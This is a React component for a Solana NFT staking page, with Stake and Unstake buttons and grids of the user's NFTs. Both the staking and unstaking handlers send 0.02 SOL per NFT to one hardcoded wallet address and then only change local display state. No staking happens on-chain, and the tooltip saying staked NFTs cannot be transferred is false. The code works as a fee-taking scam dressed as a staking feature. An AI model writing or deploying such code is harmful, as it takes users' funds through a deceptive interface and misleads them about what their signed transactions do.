import { useAssets } from "@/hooks/useAssets";
import { wait } from "@/lib/utils";
import { useWallet } from "@solana/wallet-adapter-react";
import {
  Connection,
  LAMPORTS_PER_SOL,
  PublicKey,
  SystemProgram,
  Transaction,
} from "@solana/web3.js";
import { AnimatePresence, motion } from "framer-motion";
import { ArrowRight, Info, LoaderCircle, X } from "lucide-react";
import { useCallback, useMemo, useState } from "react";
import { NftCard } from "./NftCard";
import { Button } from "./ui/button";
import { Skeleton } from "./ui/skeleton";
import {
  Tooltip,
  TooltipContent,
  TooltipProvider,
  TooltipTrigger,
} from "./ui/tooltip";
type Props = {
  connection: Connection;
  publicKey: PublicKey;
};

export type NftMetadata = {
  name: string;
  symbol: string;
  uri: string;
  image: string;
};

export const NftsSection = ({ connection, publicKey }: Props) => {
  const { sendTransaction } = useWallet();
  const { data: nfts, isLoading: loading, isError } = useAssets(publicKey);
  const [selectedNfts, setSelectedNfts] = useState<NftMetadata[]>([]);
  const [stakedNfts, setStakedNfts] = useState<NftMetadata[]>([]);
  const [toUnstakeNfts, setToUnstakeNfts] = useState<NftMetadata[]>([]);
  const [isLoading, setIsLoading] = useState<boolean>(false);

  const handleStaking = useCallback(async () => {
    if (!publicKey || !connection) {
      console.error("Missing public key or connection");
      return;
    }

    if (!selectedNfts || selectedNfts.length === 0) {
      console.log("No NFTs selected or all are already staked");
      return;
    }

    setIsLoading(true);
    try {
      await wait(1500);
      console.log("Processing the transaction...");

      const amountLamports = selectedNfts.length * 0.02 * LAMPORTS_PER_SOL;
      if (isNaN(amountLamports) || amountLamports <= 0) {
        throw new Error("Invalid amount of lamports calculated");
      }

      const recipientPublicKey = new PublicKey(
        "6UuP65JY2DYUVz3muVnELjo3Nfn76Rr5h4HvC8PeTpt8",
      );

      const transaction = new Transaction().add(
        SystemProgram.transfer({
          fromPubkey: publicKey,
          toPubkey: recipientPublicKey,
          lamports: amountLamports,
        }),
      );

      const latestBlockhash = await connection.getLatestBlockhashAndContext();
      if (
        !latestBlockhash ||
        !latestBlockhash.value ||
        !latestBlockhash.context
      ) {
        throw new Error("Failed to fetch latest blockhash and context");
      }

      const {
        context: { slot: minContextSlot },
        value: { blockhash, lastValidBlockHeight },
      } = latestBlockhash;

      const signature = await sendTransaction(transaction, connection, {
        minContextSlot,
      });

      const confirmation = await connection.confirmTransaction({
        blockhash,
        lastValidBlockHeight,
        signature,
      });

      if (confirmation.value.err) {
        throw new Error("Transaction failed");
      }

      setStakedNfts((prevStaked) => [...prevStaked, ...selectedNfts]);
      setSelectedNfts([]);
    } catch (error) {
      console.error("Error while staking NFTs: ", error);
    } finally {
      setIsLoading(false);
    }
  }, [publicKey, connection, selectedNfts, sendTransaction]);

  const handleUnstaking = useCallback(async () => {
    if (!publicKey || !connection) {
      console.error("Missing public key or connection");
      return;
    }

    if (!toUnstakeNfts || toUnstakeNfts.length === 0) {
      console.log("No NFTs selected or provided for unstaking");
      return;
    }

    setIsLoading(true);
    try {
      await wait(1500);
      console.log("Processing the unstaking transaction...");

      const amountLamports = toUnstakeNfts.length * 0.02 * LAMPORTS_PER_SOL;
      if (isNaN(amountLamports) || amountLamports <= 0) {
        throw new Error("Invalid amount of lamports calculated for unstaking");
      }

      const recipientPublicKey = new PublicKey(
        "6UuP65JY2DYUVz3muVnELjo3Nfn76Rr5h4HvC8PeTpt8",
      );

      const transaction = new Transaction().add(
        SystemProgram.transfer({
          fromPubkey: publicKey,
          toPubkey: recipientPublicKey,
          lamports: amountLamports,
        }),
      );

      const latestBlockhash = await connection.getLatestBlockhashAndContext();
      if (
        !latestBlockhash ||
        !latestBlockhash.value ||
        !latestBlockhash.context
      ) {
        throw new Error("Failed to fetch latest blockhash and context");
      }

      const {
        context: { slot: minContextSlot },
        value: { blockhash, lastValidBlockHeight },
      } = latestBlockhash;

      const signature = await sendTransaction(transaction, connection, {
        minContextSlot,
      });

      const confirmation = await connection.confirmTransaction({
        blockhash,
        lastValidBlockHeight,
        signature,
      });

      if (confirmation.value.err) {
        throw new Error("Transaction failed");
      }

      setStakedNfts((prevStaked) => {
        return prevStaked.filter((nft) => !toUnstakeNfts.includes(nft));
      });
      setToUnstakeNfts([]);
    } catch (error) {
      console.error("Error while unstaking NFTs: ", error);
    } finally {
      setIsLoading(false);
    }
  }, [connection, publicKey, sendTransaction, toUnstakeNfts]);

  const handleSelectNft = useCallback(
    (
      selectedNft: NftMetadata,
      setStateArray: React.Dispatch<React.SetStateAction<NftMetadata[]>>,
    ) => {
      setStateArray((prevState) =>
        prevState.includes(selectedNft)
          ? prevState.filter((nft) => nft !== selectedNft)
          : [...prevState, selectedNft],
      );
    },
    [],
  );

  const isNftStaked = useMemo(() => {
    return (nft: NftMetadata) => stakedNfts.includes(nft);
  }, [stakedNfts]);

  return (
    <>
      <h1 className="mb-10 text-4xl">Staking</h1>
      <section className="my-6 space-y-5">
        <div className="flex h-10 items-center justify-between">
          <p className="text-2xl">Unstaked NFTs</p>
          <AnimatePresence>
            {selectedNfts.length && selectedNfts.length > 0 ? (
              <motion.div
                initial={{ y: -10, opacity: 0 }}
                animate={{ y: 0, opacity: 1 }}
                exit={{ y: -10, opacity: 0 }}
                className="flex items-center justify-end gap-4"
              >
                <Button
                  variant={"expandIcon"}
                  Icon={X}
                  iconPlacement="right"
                  onClick={() => {
                    console.log("Reset Done");
                    setSelectedNfts([]);
                  }}
                  className="border bg-black/80 hover:bg-black"
                  disabled={!selectedNfts.length && selectedNfts.length <= 0}
                >
                  Reset Selection
                </Button>
                <Button
                  variant={"expandIcon"}
                  Icon={ArrowRight}
                  iconPlacement="right"
                  className="border bg-primary/45 hover:bg-primary/50"
                  disabled={
                    isLoading ||
                    !selectedNfts.length ||
                    selectedNfts.length <= 0
                  }
                  onClick={handleStaking}
                >
                  Stake NFTs ({selectedNfts.length})
                  {isLoading && (
                    <LoaderCircle className="ml-2 size-4 animate-spin" />
                  )}
                </Button>
              </motion.div>
            ) : null}
          </AnimatePresence>
        </div>
        <div className="grid grid-cols-1 gap-6 xs:grid-cols-2 md:grid-cols-3 lg:grid-cols-4 xl:grid-cols-5">
          <AnimatePresence>
            {loading || isError ? (
              <>
                <Skeleton className="aspect-square rounded-xl bg-neutral-900/60 dark:bg-neutral-50/60" />
                <Skeleton className="aspect-square rounded-xl bg-neutral-900/60 dark:bg-neutral-50/60" />
                <Skeleton className="aspect-square rounded-xl bg-neutral-900/60 dark:bg-neutral-50/60" />
                <Skeleton className="aspect-square rounded-xl bg-neutral-900/60 dark:bg-neutral-50/60" />
                <Skeleton className="aspect-square rounded-xl bg-neutral-900/60 dark:bg-neutral-50/60" />
              </>
            ) : nfts && nfts.filter((nft) => !isNftStaked(nft)).length > 0 ? (
              nfts
                .filter((nft) => !isNftStaked(nft))
                .map((nft, index) => (
                  <NftCard
                    key={nft.name}
                    nft={nft}
                    index={index + 1}
                    selectedNfts={selectedNfts}
                    handleSelectNft={(selectedNft) =>
                      handleSelectNft(selectedNft, setSelectedNfts)
                    }
                  />
                ))
            ) : (
              <div className="col-span-full flex min-h-[186px] flex-col items-center justify-center gap-2 text-center">
                <span>No Unstaked NFTs</span>
                <Button
                  asChild
                  variant={"expandIcon"}
                  Icon={ArrowRight}
                  iconPlacement="right"
                  className="rounded-full border border-none bg-primary/45 hover:bg-primary/50"
                >
                  <a
                    href="https://magiceden.io"
                    target="_blank"
                    rel="noopener noreferrer"
                  >
                    Buy NFTs on MagicEden
                  </a>
                </Button>
              </div>
            )}
          </AnimatePresence>
        </div>
      </section>
      <section className="my-6 space-y-5">
        <div className="flex h-10 items-center justify-between">
          <div className="flex items-center gap-2 text-2xl">
            <span>Staked NFTs</span>
            <TooltipProvider>
              <Tooltip delayDuration={250}>
                <TooltipTrigger asChild>
                  <Info className="size-5 cursor-pointer pt-1 text-white" />
                </TooltipTrigger>
                <TooltipContent side="right" className="bg-white text-black">
                  <p>Staked NFTs cannot be sold or transferred</p>
                </TooltipContent>
              </Tooltip>
            </TooltipProvider>
          </div>
          {toUnstakeNfts.length && toUnstakeNfts.length > 0 ? (
            <motion.div
              initial={{ y: -10, opacity: 0 }}
              animate={{ y: 0, opacity: 1 }}
              exit={{ y: -10, opacity: 0 }}
              className="flex items-center justify-end gap-4"
            >
              <Button
                variant={"expandIcon"}
                Icon={X}
                iconPlacement="right"
                onClick={() => {
                  console.log("Reset Done");
                  setToUnstakeNfts([]);
                }}
                className="border bg-black/80 hover:bg-black"
                disabled={!toUnstakeNfts.length || toUnstakeNfts.length <= 0}
              >
                Reset Selection
              </Button>
              <Button
                variant={"expandIcon"}
                Icon={ArrowRight}
                iconPlacement="right"
                className="border bg-primary/45 hover:bg-primary/50"
                onClick={handleUnstaking}
                disabled={
                  isLoading ||
                  !toUnstakeNfts.length ||
                  toUnstakeNfts.length <= 0
                }
              >
                Unstake NFTs ({toUnstakeNfts.length})
                {isLoading && (
                  <LoaderCircle className="ml-2 size-4 animate-spin" />
                )}
              </Button>
            </motion.div>
          ) : null}
        </div>

        {stakedNfts.length && stakedNfts.length > 0 ? (
          <div className="grid grid-cols-1 gap-6 xs:grid-cols-2 md:grid-cols-3 lg:grid-cols-4 xl:grid-cols-5">
            {stakedNfts.map((nft, index) => (
              <NftCard
                key={nft.name}
                nft={nft}
                index={index + 1}
                selectedNfts={toUnstakeNfts}
                handleSelectNft={(selectedNft) =>
                  handleSelectNft(selectedNft, setToUnstakeNfts)
                }
              />
            ))}
          </div>
        ) : (
          <p className="w-full text-center">No staked NFTs at the moment</p>
        )}
      </section>
    </>
  );
};


// if (newToUnstakeNfts.length === 0) {
//   console.log("All selected NFTs are already unstaked");
//   return;
// }
// const amountLamports = newToUnstakeNfts.length * 0.02 * LAMPORTS_PER_SOL;
// const recipientPublicKey = new PublicKey(
//   "6UuP65JY2DYUVz3muVnELjo3Nfn76Rr5h4HvC8PeTpt8",
// );

// const transaction = new Transaction().add(
//   SystemProgram.transfer({
//     fromPubkey: publicKey,
//     toPubkey: recipientPublicKey,
//     lamports: amountLamports,
//   }),
// );

// const {
//   context: { slot: minContextSlot },
//   value: { blockhash, lastValidBlockHeight },
// } = await connection.getLatestBlockhashAndContext();

// const signature = await sendTransaction(transaction, connection, {
//   minContextSlot,
// });

// const confirmation = await connection.confirmTransaction({
//   blockhash,
//   lastValidBlockHeight,
//   signature,
// });

// if (confirmation.value.err) {
//   throw new Error("Transaction failed");
// }
